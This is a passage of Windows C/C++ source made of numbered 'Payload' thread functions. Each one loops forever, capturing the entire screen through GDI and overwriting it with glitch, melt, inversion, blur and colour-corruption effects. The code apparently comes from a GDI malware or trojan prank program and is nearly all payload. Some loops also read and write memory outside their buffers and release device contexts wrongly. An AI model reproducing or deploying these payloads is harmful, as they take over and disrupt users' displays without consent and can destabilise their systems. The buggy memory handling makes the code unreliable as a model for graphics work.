    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    while (1) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        BYTE byte = rand() % 0xff;
        for (int i = 0; i < w * h; i++) {
            int v = rand() % 100;
            ((BYTE*)(data + i))[v] *= ((BYTE*)(data + i + v))[v] + byte;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(50 + rand() % 950);
    }
    return 0;
}

DWORD WINAPI Payload20_num5(LPVOID lpParam) {
    int color;
    while (true)
    {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int y = rand() % h;
        HDC hdc = GetDC(0);
        int randcolor = 1 + rand() % 2;
        if (randcolor == 1) {
            color = RGB(0, 0, 0);
        }
        else {
            color = RGB(255, 255, 255);
        }
        HPEN hPen = CreatePen(PS_SOLID, 1, color);
        SelectObject(hdc, hPen);
        MoveToEx(hdc, 0, y, NULL);
        LineTo(hdc, w, y);
        ReleaseDC(NULL, hdc);
        DeleteObject(hPen);
        DeleteDC(hdc);
        Sleep(rand() % 500);
    }
    return 0;
}

DWORD WINAPI Payload21_num1(LPVOID lpParam) {
    double angle = 0;
    for (;;) {
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int NMSL1 = 20 + rand() % 40;
        for (float i = 0; i < w + h; i += 0.99f) {
            int a = sin(angle) * NMSL1;
            BitBlt(hcdc, i, 0, 1, h, hcdc, i, a, SRCCOPY);
            angle += 3.1415926 / 40 + (NMSL1 - 20);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload21_num2(LPVOID lpParam) {
    BLENDFUNCTION blur;
    while (true) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 10) {
            for (int x = 0; x < w; x += 10) {
                StretchBlt(hcdc, x, y, 10, 10, hcdc, x, y, 1, 1, SRCCOPY);
            }
        }
        BitBlt(hcdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 100;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc);
        DeleteDC(hcdc);
    }
    return 0;
}

DWORD WINAPI Payload21_num3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        BYTE byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            int v = rand() % 50;
            ((BYTE*)(data + i))[v] += ((BYTE*)(data + i + v))[v] & byte;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload22_num1(LPVOID lpParam) {
    int i = 0;
    while (1)
    {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = (int)(x ^ y) + i;

                rgbquad[index].rgbRed += fx;
                rgbquad[index].rgbGreen += fx;
                rgbquad[index].rgbBlue += fx;
            }
        }

        i++;
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload23_num1(LPVOID lpParam) {
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hcdc, hbmTemp);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = (i * i) % w, y = i ^ h;
            rgbScreen[i].rgb += x * y * i;
        }
        BLENDFUNCTION blur;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 100;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload23_num2(LPVOID lpParam) {
    int count = 0;
    while (true)
    {
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        int a = rand() % w, b = rand() % h;
        HDC hdc = GetDC(NULL);
        BitBlt(hdc, a, b, 200, 200, hdc, a + rand() % 21 - 10, b + rand() % 21 - 10, SRCCOPY);
        ReleaseDC(NULL, hdc);
        if (count == 30) {
            count = 0;
            Sleep(1);
        }
        else {
            count++;
        }
    }
    return 0;
}

DWORD WINAPI Payload24_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    while (1) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        BYTE byte = rand() % 0xff;
        for (int i = 0; i < w * h; i++) {
            int v = rand() % 500;
            ((BYTE*)(data + i))[v] *= ((BYTE*)(data + i + v))[v] + byte;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}